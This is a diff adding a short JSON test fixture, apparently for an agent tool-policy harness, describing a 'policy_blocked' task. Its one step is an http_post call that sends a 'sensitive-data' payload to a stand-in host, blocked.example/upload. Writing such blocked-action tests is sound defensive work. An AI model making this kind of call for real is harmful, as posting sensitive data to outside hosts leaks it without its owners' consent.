@@ -1,0 +1,16 @@
+{
+  "name": "policy_blocked_task",
+  "category": "policy_blocked",
+  "steps": [
+    {
+      "tool_name": "http_post",
+      "args": {
+        "url": "https://blocked.example/upload",
+        "json_body": {
+          "payload": "sensitive-data"
+        },
+        "timeout_s": 3
+      }
+    }
+  ]
+}
